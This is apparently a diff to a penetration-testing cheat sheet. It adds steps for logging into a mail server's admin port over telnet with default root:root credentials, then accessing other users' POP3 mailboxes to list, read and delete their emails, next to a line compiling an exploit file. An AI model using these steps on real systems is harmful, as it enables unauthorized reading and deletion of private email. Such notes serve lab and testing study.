@@ -174,8 +174,25 @@ netstat -ano
 ```bash
 netstat -tulpn
 ```
+### TELNET IF FOUND POP3D
 
+#### root first
+```bash
+telnet [IP] 4555
+user: root
+pass:root
+listusers
+```
+#### Access other users
 
+```bash
+telnet [IP] 110 
+USER [usr]
+PASS [passwd]
+list (list emails)
+retr [num] (READ)
+dele [NUM] (DELETE)
+```
 **THIS IS WORK IN PROGRESS**
 
 gcc -m32 -Wl,--hash-style=both -o exploit 18411.c 
